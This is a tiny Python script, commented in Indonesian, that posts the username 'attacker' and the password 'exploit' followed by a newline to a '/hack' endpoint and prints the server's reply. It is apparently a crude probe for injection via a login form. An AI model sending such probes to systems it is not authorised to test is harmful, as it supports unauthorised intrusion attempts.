import requests

url = "https://swi.al3xzer0.cfd/hack"  # Ganti dengan IP/host target

data = {
    "username": "attacker",
    "password": "exploit\n"
}

response = requests.post(url, data=data)

print("[+] Server Response:")
print(response.text)

